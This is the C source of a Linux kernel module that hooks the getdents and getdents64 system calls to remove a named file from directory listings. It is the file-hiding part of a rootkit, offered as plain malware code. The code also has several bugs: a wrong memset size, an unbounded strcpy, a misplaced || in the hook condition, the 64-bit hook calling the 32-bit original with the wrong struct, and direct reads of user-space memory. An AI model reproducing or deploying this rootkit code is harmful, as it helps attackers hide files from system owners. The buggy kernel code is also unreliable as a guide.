#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include "hide_file.h"
#include "hooking.h"

#define MAX_NAME_LENGTH 30

// definition of struct linux_dirent, as it is not in any header file
struct linux_dirent {
	unsigned long  d_ino;
	unsigned long  d_off;
	unsigned short d_reclen;
	char           d_name[];
};


static t_syscall old_getdents;
static t_syscall old_getdents64;
static asmlinkage long new_getdents(const struct pt_regs *pt_regs);
static asmlinkage long new_getdents64(const struct pt_regs *pt_regs);
static char file_name[MAX_NAME_LENGTH];

int init_hide_file(char *f_name){
	if (!f_name){
		printk(KERN_INFO "[-] No file name to hide given.\n");
		return -1;
	}
	memset(file_name, 0, sizeof(MAX_NAME_LENGTH));
	strcpy(file_name, f_name);

	// save old syscalls
	old_getdents = get_syscall(__NR_getdents);
	old_getdents64 = get_syscall(__NR_getdents64);

	// hook and new syscalls
	if (add_hook((unsigned long) new_getdents, __NR_getdents
		|| add_hook((unsigned long) new_getdents64, __NR_getdents64))) {
		return -1;
	}

	return 0;
}

// new getdents syscall to hook
static asmlinkage long new_getdents(const struct pt_regs *pt_regs) {
	int nread, bpos, reclen;
	long len;
	char *next;
	struct linux_dirent *dirp = (struct linux_dirent*)pt_regs->si;

	nread = old_getdents(pt_regs);

	bpos = 0;
	// going through the linux_dirent structs
	while (bpos < nread) {
		// removing any dirent with file name file_name to hide them
		if (!strcmp(dirp->d_name, file_name)) {
			reclen = dirp->d_reclen;
			next = (char*)dirp + reclen;
			len = pt_regs->si + nread - (long) next;
			memmove(dirp, next, len);
			nread -= reclen;
			continue;
        }
		bpos += dirp->d_reclen;
		dirp = (struct linux_dirent*)((char*)pt_regs->si + bpos);
	}

	return nread;
}

// new getdents64 syscall to hook
static asmlinkage long new_getdents64(const struct pt_regs *pt_regs) {
	int nread, bpos, reclen;
	long len;
	char *next;
	struct linux_dirent *dirp = (struct linux_dirent *)pt_regs->si;

	nread = old_getdents(pt_regs);

	bpos = 0;
	// going through the linux_dirent structs
	while (bpos < nread) {
		// removing any dirent with file name file_name to hide them
		if (!strcmp(dirp->d_name, file_name)) {
			reclen = dirp->d_reclen;
			next = (char *) dirp + reclen;
			len = pt_regs->si + nread - (long) next;
			memmove(dirp, next, len);
			nread -= reclen;
			continue;
        }
		bpos += dirp->d_reclen;
		dirp = (struct linux_dirent*)((char*)pt_regs->si + bpos);
	}

	return nread;
}
